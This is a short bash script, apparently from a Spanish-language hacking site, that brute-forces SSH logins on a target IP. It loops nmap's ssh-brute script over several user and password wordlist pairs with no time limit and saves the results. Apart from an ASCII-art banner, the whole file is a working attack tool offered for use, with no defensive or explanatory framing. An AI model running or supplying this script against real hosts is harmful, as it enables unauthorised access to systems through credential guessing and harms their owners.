#!/bin/bash
cat << "INFO"

                                                          ..
                               ,,,                         MM .M
                           ,!MMMMMMM!,                     MM MM  ,.
   ., .M                .MMMMMMMMMMMMMMMM.,          'MM.  MM MM .M'
 . M: M;  M          .MMMMMMMMMMMMMMMMMMMMMM,          'MM,:M M'!M'
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 M;MM;M :MM      .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.       .MMMMMMMM
 'M;M'M MM      MMMMMM  MMMMMMMMMMMMMMMMM  MMMMMM.    ,,M.M.'MMM'
  MM'MMMM      MMMMMM @@ MMMMMMMMMMMMMMM @@ MMMMMMM.'M''MMMM;MM'
 MM., ,MM     MMMMMMMM  MMMMMMMMMMMMMMMMM  MMMMMMMMM      '.MMM
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
   MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
  .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
  MMM      :M  'MMMMMMMMMMM bruteSSH MMMMMMMM'.MM  MM:M.    'MMMMM
 .MMM   ...:M: :M.'MMMMMMMMMMMMMMMMMMMMMMMMM'.M''   MM:MMMMMMMMMMMM'
AMMM..MMMMM:M.    :M.'MMMMMMMMMMMMMMMMMMMM'.MM'     MM''''''''''''
MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
 '''''''''':MM.       'MM!M.'M-M-M-M'M.'MM'        MMM
            MMM.            'MMMM!MMMM'            .MM
             MMM.             '''   ''            .MM'
              MMM.                               MMM'
               MMMM            ,.J.JJJJ.       .MMM'
                MMMM.       'JJJJJJJ'JJJM   CMMMMM
                  MMMMM.    'JJJJJJJJ'JJJ .MMMMM'
                    MMMMMMMM.'  'JJJJJ'JJMMMMM'
                      'MMMMMMMMM'JJJJJ JJJJJ'
                         ''MMMMMMJJJJJJJJJJ'
                                 'JJJJJJJJ'

                                                 http://www.hackingyseguridad.com 
INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a SSH."
        echo "Requiere nmap"
        echo "Uso.: sh brutessh.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oN resultado0.txt
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves.txt,unpwdb.timelimit=0 -oN resultado1.txt
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios0.txt,passdb=claves2.txt,unpwdb.timelimit=0 -oN resultado2.txt
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oN resultado3.txt
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0 -oN resultado4.txt
nmap -Pn $1 $2 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves2.txt,unpwdb.timelimit=0 -oN resultado5.txt
